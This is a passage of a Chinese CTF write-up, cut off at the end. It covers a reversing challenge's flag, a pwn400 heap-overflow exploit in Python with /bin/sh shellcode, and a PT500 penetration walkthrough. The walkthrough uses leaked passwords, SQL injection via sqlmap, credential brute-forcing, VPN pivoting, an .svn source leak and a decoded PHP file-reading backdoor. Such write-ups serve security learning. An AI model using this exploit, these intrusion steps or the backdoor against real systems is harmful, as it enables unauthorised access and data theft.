style="font-family:宋体">输入的字串，第一次变换是与自己所在的标号异或。第二次变换可能是</span>syc<span style="font-family:宋体">（对应长度为</span>6<span style="font-family:宋体">）和</span>xctf<span style="font-family:宋体">（对应长度为</span>9<span style="font-family:宋体">）两种之一，做了下移位。</span></p><p><span style="font-family:宋体">第三次变换是对大写字母，小写字母，和除此之外其他情况做了处理，得到的字符串的前</span>11<span style="font-family:宋体">位可以通过解方程得到，</span>GoodCracK3R<span style="font-family:宋体">。</span></p><p>11<span style="font-family:宋体">位之后的数，经过处理后又和</span>a8e5588f7e3f758<span style="font-family:宋体">比较，相等才返回</span>1<span style="font-family:宋体">，总共</span>15<span style="font-family:宋体">位，那肯定是</span>8<span style="font-family:宋体">位输入，对应</span>15<span style="font-family:宋体">或</span>16<span style="font-family:宋体">位，于是把这</span>8<span style="font-family:宋体">位跑了一下，测试了下结果。</span></p><p><span style="font-family:宋体">和前面的</span>GoodCracK3R<span style="font-family:宋体">结合起来，为</span>&quot;GoodCracK3R;{0jN|B6&quot;<span style="font-family:宋体">，然后倒推第二次变换和第一次变换，就可推出</span>KEY</p><p>FLAG<span style="font-family:宋体">：</span>xctf{hgJ7Q=|8a\wV;A~}}Wc}</p><p style="text-align:center"><span style="font-size: 16px;font-family: 宋体"><img style="width: 200px;height: 344px" alt="t01085ab39566573509.png" src="http://p0.qhimg.com/t01085ab39566573509.png" title="t01085ab39566573509.png" height="344" vspace="0" width="200" border="0"/></span></p><p><span style="color:black">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong>pwn400</strong></p><p>node<span style="font-family:宋体">之间通过双向链表连接起来，</span>show node<span style="font-family:宋体">可以回显</span>node<span style="font-family:宋体">在内存中的地址，</span>edite node<span style="font-family:宋体">可以过界修改一个</span>node<span style="font-family:宋体">的</span>content<span style="font-family:宋体">，从而覆盖</span>next node<span style="font-family:宋体">的头部。类似于堆溢出的利用。</span></p><p><span style="font-family:宋体">程序没有</span>nx<span style="font-family:宋体">，可直接执行</span>shellcode<span style="font-family:宋体">。</span></p><p style="text-align:center"><img style="width: 600px;height: 30px" alt="t0125681741bea053d7.png" src="http://p0.qhimg.com/t0125681741bea053d7.png" title="t0125681741bea053d7.png" height="30" vspace="0" width="600" border="0"/></p><p>Exp<span style="font-family:宋体">如下</span></p><p></p><pre class="brush:python;toolbar:false">#coding:utf-8
&nbsp;
from&nbsp;socket&nbsp;import&nbsp;*
import&nbsp;struct
import&nbsp;time
import&nbsp;threading
import&nbsp;sys
&nbsp;
is_recv&nbsp;=&nbsp;True
&nbsp;
sock_host&nbsp;=&nbsp;&#39;192.168.206.130&#39;
sock_port&nbsp;=&nbsp;8080
&nbsp;
S&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM)
&nbsp;
def&nbsp;send(ss,&nbsp;tail&nbsp;=&nbsp;&#39;&#39;,&nbsp;recv&nbsp;=&nbsp;False):
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;if&nbsp;tail:
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;+=&nbsp;tail
&nbsp;&nbsp;print&nbsp;ss
&nbsp;&nbsp;S.send(ss)
&nbsp;&nbsp;if&nbsp;recv:
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
def&nbsp;outputrecv():
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;is_recv:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;&nbsp;S.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.stdout.write(i)
&nbsp;
def&nbsp;start_recv():
&nbsp;&nbsp;#start&nbsp;recv
&nbsp;&nbsp;t&nbsp;=&nbsp;threading.Thread(target&nbsp;=&nbsp;outputrecv,&nbsp;&nbsp;args&nbsp;=&nbsp;())
&nbsp;&nbsp;t.daemon&nbsp;=&nbsp;True
&nbsp;&nbsp;t.start()
&nbsp;
def&nbsp;get_shell():
&nbsp;&nbsp;#start&nbsp;recv
&nbsp;&nbsp;start_recv()
&nbsp;
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.1)
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;raw_input()&nbsp;+&nbsp;&#39;\n&#39;
&nbsp;&nbsp;&nbsp;&nbsp;S.send(ss)
&nbsp;
&nbsp;
def&nbsp;main():
&nbsp;&nbsp;global&nbsp;S
&nbsp;
&nbsp;&nbsp;if&nbsp;len(sys.argv)&nbsp;==&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;sock_host&nbsp;=&nbsp;sys.argv[1]
&nbsp;&nbsp;&nbsp;&nbsp;sock_port&nbsp;=&nbsp;int(sys.argv[2])
&nbsp;
&nbsp;&nbsp;S.connect((sock_host,&nbsp;sock_port))
&nbsp;
&nbsp;&nbsp;a&nbsp;=&nbsp;raw_input(&#39;pause&#39;)
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;#first&nbsp;node
&nbsp;&nbsp;send(&#39;1&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;111&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;111&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;111&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;#second&nbsp;node
&nbsp;&nbsp;send(&#39;1&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;222&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;222&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;222&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;#third&nbsp;node
&nbsp;&nbsp;send(&#39;1&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;333&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;333&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;333&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;time.sleep(1)
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;#record&nbsp;first&nbsp;node&nbsp;pointer
&nbsp;&nbsp;send(&#39;3&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;111&#39;)
&nbsp;&nbsp;data&nbsp;=&nbsp;S.recv(1024)
&nbsp;&nbsp;print&nbsp;data
&nbsp;&nbsp;e&nbsp;=&nbsp;data.find(&#39;location:&#39;)
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;e&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;S.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e&nbsp;=&nbsp;data.find(&#39;location:&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;print&nbsp;e,&nbsp;data[e+9:e+19]
&nbsp;&nbsp;p_first_node&nbsp;=&nbsp;int(data[e+9:e+19],&nbsp;16)
&nbsp;
&nbsp;&nbsp;#record&nbsp;second&nbsp;node&nbsp;pointer
&nbsp;&nbsp;send(&#39;3&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;222&#39;)
&nbsp;&nbsp;data&nbsp;=&nbsp;S.recv(1024)
&nbsp;&nbsp;print&nbsp;data
&nbsp;&nbsp;e&nbsp;=&nbsp;data.find(&#39;location:&#39;)
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;e&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;S.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e&nbsp;=&nbsp;data.find(&#39;location:&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;p_second_node&nbsp;=&nbsp;int(data[e+9:e+19],&nbsp;16)
&nbsp;
&nbsp;&nbsp;print&nbsp;&#39;pointer&nbsp;of&nbsp;first,second&nbsp;node:&#39;,&nbsp;hex(p_first_node),&nbsp;hex(p_second_node)
&nbsp;
&nbsp;&nbsp;nops&nbsp;=&nbsp;&#39;\x90&#39;*&nbsp;(p_second_node&nbsp;-&nbsp;p_first_node&nbsp;-&nbsp;108)
&nbsp;&nbsp;jmp&nbsp;=&nbsp;&#39;\xeb\x06\x90\x90\x90\x90\x90\x90&#39;
&nbsp;&nbsp;#exec&nbsp;/bin/sh&nbsp;-&nbsp;43&nbsp;bytes
&nbsp;&nbsp;buf&nbsp;=&nbsp;&nbsp;&quot;&quot;
&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\xdd\xc2\xd9\x74\x24\xf4\x5b\x2b\xc9\xba\x39\x29\xde&quot;
&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\xee\xb1\x0b\x31\x53\x1a\x83\xc3\x04\x03\x53\x16\xe2&quot;
&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\xcc\x43\xd5\xb6\xb7\xc6\x8f\x2e\xea\x85\xc6\x48\x9c&quot;
&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\x66\xaa\xfe\x5c\x11\x63\x9d\x35\x8f\xf2\x82\x97\xa7&quot;
&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\x0d\x45\x17\x38\x21\x27\x7e\x56\x12\xd4\xe8\xa6\x3b&quot;
&nbsp;&nbsp;buf&nbsp;+=&nbsp;&quot;\x49\x61\x47\x0e\xed&quot;
&nbsp;
&nbsp;&nbsp;shellcode&nbsp;=&nbsp;jmp+buf
&nbsp;
&nbsp;&nbsp;#edite&nbsp;first&nbsp;node
&nbsp;&nbsp;send(&#39;4&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(&#39;111&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(nops&nbsp;+&nbsp;struct.pack(&#39;I&#39;,&nbsp;p_second_node)&nbsp;+&nbsp;&#39;\x70\xa4\x04\x08&#39;&nbsp;+&nbsp;struct.pack(&#39;I&#39;,&nbsp;p_second_node&nbsp;+&nbsp;0xc)&nbsp;+&nbsp;shellcode)&nbsp;
&nbsp;
&nbsp;&nbsp;#delete&nbsp;node
&nbsp;&nbsp;send(&#39;5&#39;,&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;&nbsp;send(hex(p_second_node)[2:10],&nbsp;recv&nbsp;=&nbsp;True)
&nbsp;
&nbsp;&nbsp;get_shell()
&nbsp;
&nbsp;
if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
&nbsp;&nbsp;main()</pre><p><span style="color:black">&nbsp;</span><br/></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings;color:black">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="color:black">PT500</span></strong></p><p><strong>渗透进三叶草花卉公司，寻找一个名为</strong><strong>torrent</strong><strong>的文件</strong><strong> </strong><strong>公司网址：</strong><strong>corp.sycsec.com</strong></p><p><span style="font-family:宋体">这个渗透环节出的屌死了</span>~</p><p><a href="http://corp.sycsec.com/news.html">http://corp.sycsec.com/news.html</a></p><p><span style="font-family:宋体">查看源代码，可以看到。</span></p><p style="text-align:center"><img style="width: 600px;height: 181px" alt="t01da677b12c818600e.png" src="http://p7.qhimg.com/t01da677b12c818600e.png" title="t01da677b12c818600e.png" height="181" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">查社工库，查到妹纸密码是：</span>971989823</p><p><span style="font-family:宋体">结合在新闻页面的提示：</span></p><p style="text-align:center"><img style="width: 600px;height: 296px" alt="t0110c27761cf47ec6a.png" src="http://p4.qhimg.com/t0110c27761cf47ec6a.png" title="t0110c27761cf47ec6a.png" height="296" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">于是访问</span><a href="http://report-man.sycsec.com/login.php">http://report-man.sycsec.com/login.php</a></p><p><span style="font-family:宋体">工号</span>SYC083</p><p><span style="font-family:宋体">密码</span>971989823</p><p><span style="font-family:宋体">成功登陆，有一个文件上传，一开始以为是绕过上传漏洞，结果最后发现文件名处存在注入。</span></p><p style="text-align:center"><img style="width: 600px;height: 166px" alt="t017e5be42d17661da8.png" src="http://p0.qhimg.com/t017e5be42d17661da8.png" title="t017e5be42d17661da8.png" height="166" vspace="0" width="600" border="0"/></p><p style="text-align:center"><img style="width: 600px;height: 87px" alt="t015b0d8730ae5accdf.png" src="http://p2.qhimg.com/t015b0d8730ae5accdf.png" title="t015b0d8730ae5accdf.png" height="87" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">没有任何限制，直接用</span>sqlmap<span style="font-family:宋体">跑。</span></p><p><span style="font-family:宋体">根据提示，</span></p><p><span style="font-family:宋体">重点关注数据库中名为刘明的用户。</span></p><p><span style="font-family:宋体">得到其邮箱</span></p><p><a href="mailto:liuming@sycsec.com">liuming@sycsec.com</a></p><p><span style="font-family:宋体">而小静的邮箱是</span></p><p><a href="mailto:xiaojing@sycsec.com">xiaojing@sycsec.com</a></p><p><span style="font-family:宋体">于是猜测有一个员工邮箱系统。</span></p><p>LINK<span style="font-family:宋体">：</span><a href="http://mail.sycsec.com/login.php">http://mail.sycsec.com/login.php</a></p><p style="text-align:center"><img style="width: 600px;height: 205px" alt="t01dd19f069589c1a14.png" src="http://p1.qhimg.com/t01dd19f069589c1a14.png" title="t01dd19f069589c1a14.png" height="205" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">用户名</span>&nbsp; <a href="mailto:liuming@sycsec.com">liuming@sycsec.com</a></p><p><span style="font-family:宋体">密码</span> liuming123</p><p><span style="font-family:宋体">登陆成功</span></p><p><span style="font-family:宋体">登陆后发现大概有这样几篇邮件比较关键。</span></p><p>1.</p><p>﻿<span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">发件人：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">Information Tech [IT@sycsec.com]</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">时间：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5"> 2014-09-01</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> <span style="background:#F7F5F5">===================================</span><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">通知</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">:</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">公司</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">VPN</span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">地址：</span><span style="font-size: 12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">vpn.sycsec.com</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">默认用户名：工号</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5"> (</span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">如：</span><span style="font-size: 12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">SYC001)</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">默认登录密码：工号</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5"> + </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">生日</span><span style="font-size: 12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5"> (</span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">如：工号为</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">SYC001</span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">，生日为</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">19900101</span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">的用户，密码为：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">SYC001900101)</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> <br/> <span style="background:#F7F5F5">Information Tech</span><br/> <span style="background:#F7F5F5">Do not Reply</span></span></p><p><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">&nbsp;</span></p><p>2.</p><p>﻿<span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">发件人：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">Information Tech [IT@sycsec.com]</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">时间：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5"> 2014-11-20</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> <span style="background:#F7F5F5">===================================</span><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">通知</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">:</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">最近文件共享服务器受到源于内部的暴力破解攻击，现在未确定攻击者</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">请大家切记把密码改复杂！防止资料泄漏！</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> <br/> <span style="background:#F7F5F5">Information Tech</span><br/> <span style="background:#F7F5F5">Do not Reply</span></span></p><p><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">&nbsp;</span></p><p>3.</p><p>﻿<span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">发件人：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">Information Tech [IT@sycsec.com]</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">时间：</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5"> 2014-11-25</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> <span style="background:#F7F5F5">===================================</span><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">通知</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">:</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">我们的</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">VPN</span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">系统出现了问题，现在换成了旧版本系统，可能操作不太方便</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> </span><span style="font-size:12px;font-family:宋体;color:black;background:#F7F5F5">但是大家先暂时忍受一下，我们会即使处理该问题的，谢谢合作</span><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black"><br/> <br/> <span style="background:#F7F5F5">Information Tech</span><br/> <span style="background:#F7F5F5">Do not Reply</span></span></p><p><span style="font-size:12px;font-family:&#39;Verdana&#39;,&#39;sans-serif&#39;;color:black;background:#F7F5F5">&nbsp;</span></p><p>&nbsp;</p><p><span style="font-family:宋体">首先关注到</span>vpn.sycsec.com</p><p><span style="font-family:宋体">根据隐藏信息，有个默认登陆密码，于是用</span>burpsuite<span style="font-family:宋体">爆破。</span></p><p><span style="font-family:宋体">最终得到用户名与密码</span></p><p>SYC079</p><p>SYC079940927</p><p><span style="font-family:宋体">登陆后发现这就是一个网页版本的</span>curl<span style="font-family:宋体">。</span></p><p style="text-align:center"><img style="width: 600px;height: 138px" alt="t0125b526f33ff7a338.png" src="http://p8.qhimg.com/t0125b526f33ff7a338.png" title="t0125b526f33ff7a338.png" height="138" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">根据题意，需要得到一个名为</span>torrent<span style="font-family:宋体">的文件，猜测应该在</span>file.sycsec.com<span style="font-family:宋体">服务器上。</span></p><p><span style="font-family:宋体">而</span>file.sycsec.com<span style="font-family:宋体">我本机无法访问，应该就是要用</span>vpn<span style="font-family:宋体">做跳板来攻击。</span></p><p><span style="font-family:宋体">于是尝试</span></p><p><br/></p><p style="text-align:center"><img style="width: 600px;height: 138px" alt="t0125b526f33ff7a338.png" src="http://p8.qhimg.com/t0125b526f33ff7a338.png" title="t0125b526f33ff7a338.png" height="138" vspace="0" width="600" border="0"/></p><p><br/></p><p><span style="font-family:宋体">居然也无法访问。几经尝试，</span>ping<span style="font-family:宋体">了一下</span>file.sycsec.com</p><p style="text-align:center"><img style="width: 600px;height: 146px" alt="t017e75b642e1329447.png" src="http://p4.qhimg.com/t017e75b642e1329447.png" title="t017e75b642e1329447.png" height="146" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">这是一个内网</span>IP<span style="font-family:宋体">。可能</span>vpn<span style="font-family:宋体">这台服务器上没有</span>dns<span style="font-family:宋体">解析服务。于是尝试访问</span>http://10.24.13.37/index.php</p><p style="text-align:center"><img style="width: 600px;height: 195px" alt="t01385eb8c2077a9f3e.png" src="http://p1.qhimg.com/t01385eb8c2077a9f3e.png" title="t01385eb8c2077a9f3e.png" height="195" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">跳转到了</span>login.php</p><p style="text-align:center"><img style="width: 600px;height: 291px" alt="t014a68348516dc53ac.png" src="http://p4.qhimg.com/t014a68348516dc53ac.png" title="t014a68348516dc53ac.png" height="291" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">结果又是一个登陆系统，然后我们就一直在尝试爆破密码，各种密码组合，花了几个小时都没有拿下。比赛比赛快结束的时候，</span>cy<span style="font-family:宋体">大屌扫了一下目录，发现居然存在</span>/.svn/<span style="font-family:宋体">这个目录。</span>K<span style="font-family:宋体">牛马上想到了</span>svn<span style="font-family:宋体">泄露漏洞，于是乎</span>~</p><p><a href="http://10.24.13.37/.svn/wc.db">http://10.24.13.37/.svn/wc.db</a></p><p style="text-align:center"><img style="width: 600px;height: 340px" alt="t0151c4a5d94bbf4fd5.png" src="http://p6.qhimg.com/t0151c4a5d94bbf4fd5.png" title="t0151c4a5d94bbf4fd5.png" height="340" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">下载之</span>~</p><p style="text-align:center"><span style="font-size: 16px;font-family: 宋体"><img style="width: 600px;height: 173px" alt="t0158064f05c7812bcc.jpg" src="http://p5.qhimg.com/t01b6f5ff8c1ef9edd1.jpg" title="t0158064f05c7812bcc.jpg" height="173" vspace="0" width="600" border="0"/></span></p><p>Svn<span style="font-family:宋体">泄露漏洞的原理是程序员写代码后没有使用</span>svn export<span style="font-family:宋体">，而是直接把版本库中的源码复制到</span>web<span style="font-family:宋体">目录。于是</span>.svn<span style="font-family:宋体">这个隐藏文件夹也被复制过去了。</span></p><p>SVN<span style="font-family:宋体">产生的</span>.svn<span style="font-family:宋体">目录下还包含了以</span>.svn-base<span style="font-family:宋体">结尾的源代码文件副本（低版本</span>SVN<span style="font-family:宋体">具体路径为</span>text-base<span style="font-family:宋体">目录，高版本</span>SVN<span style="font-family:宋体">为</span>pristine<span style="font-family:宋体">目录）。</span></p><p><span style="font-family:宋体">并且在最新版本中，副本文件名被</span>hash<span style="font-family:宋体">了</span>,<span style="font-family:宋体">文件格式为：</span></p><p>hash<span style="font-family:宋体">前两位</span>/hash.svn-base</p><p><span style="font-family:宋体">但是这都可以在</span>wc.db<span style="font-family:宋体">文件中读取到。</span></p><p style="text-align:center"><img style="width: 600px;height: 372px" alt="t017684b05925f19046.png" src="http://p3.qhimg.com/t017684b05925f19046.png" title="t017684b05925f19046.png" height="372" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">如图</span></p><p>Sys_incude/.htccess<span style="font-family:宋体">的</span>hash<span style="font-family:宋体">是</span>$sha1$43b6ec45bd6ea6da7e3b7c313b2cc4d3279afd07</p><p><span style="font-family:宋体">那么其副本文件就放在</span></p><p>/.svn/pristine/43/43b6ec45bd6ea6da7e3b7c313b2cc4d3279afd07.svn-base</p><p>&nbsp;</p><p><span style="font-family:宋体">一开始读了</span> login.php down.php<span style="font-family:宋体">几个关键文件的源码，发现都没有漏洞。</span></p><p><span style="font-family:宋体">后来发现有个</span>syc_include/.htaccess,<span style="font-family:宋体">很可疑，读取之，代码如下。</span></p><p style="text-align:center"><span style="font-size: 16px;font-family: 宋体"><img style="width: 600px;height: 312px" alt="t012234e991a4aa59b6.jpg" src="http://p7.qhimg.com/t01b57ab7448ee40bad.jpg" title="t012234e991a4aa59b6.jpg" height="312" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体">这是一个后门程序，只要是</span>sys_include<span style="font-family:宋体">目录下任意</span>php<span style="font-family:宋体">文件执行时，都会自动包含</span>images/copper.png.</p><p><span style="font-family:宋体">下载之</span>~</p><p style="text-align:center"><img style="width: 600px;height: 375px" alt="t0105f5881ecc0ab2c3.png" src="http://p3.qhimg.com/t0105f5881ecc0ab2c3.png" title="t0105f5881ecc0ab2c3.png" height="375" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">发现文件尾存在着加过密的</span>php<span style="font-family:宋体">代码。</span></p><p><span style="font-family:宋体">看格式应该是</span>php<span style="font-family:宋体">神盾加密。网上可以解密。</span></p><p>LINK: http://blog.99tk.cn/decode#</p><p><span style="font-family:宋体">解密后代码如下：</span></p><pre class="brush:php;toolbar:false">&lt;?php
if&nbsp;(!function_exists(&#39;scandir&#39;))&nbsp;{
&nbsp;&nbsp;function&nbsp;scandir($cwd)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$files&nbsp;=&nbsp;array();
&nbsp;&nbsp;&nbsp;&nbsp;$dh&nbsp;=&nbsp;opendir($cwd);
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;($file&nbsp;=&nbsp;readdir($dh))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$files[]&nbsp;=&nbsp;$file;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$files&nbsp;?&nbsp;$files&nbsp;:&nbsp;0;
&nbsp;&nbsp;}
}
if&nbsp;(isset($_GET[&#39;fil3&#39;]))&nbsp;{
&nbsp;&nbsp;$filename&nbsp;=&nbsp;$_GET[&#39;fil3&#39;];
&nbsp;&nbsp;if&nbsp;(is_file($filename)&nbsp;&amp;&amp;&nbsp;is_readable($filename))&nbsp;{@ob_end_clean();
&nbsp;&nbsp;&nbsp;&nbsp;$fileinfo&nbsp;=&nbsp;pathinfo($filename);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(function_exists(&#39;mime_content_type&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$type&nbsp;=&nbsp;@mime_content_type($filename);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Type:&nbsp;&quot;.$type);
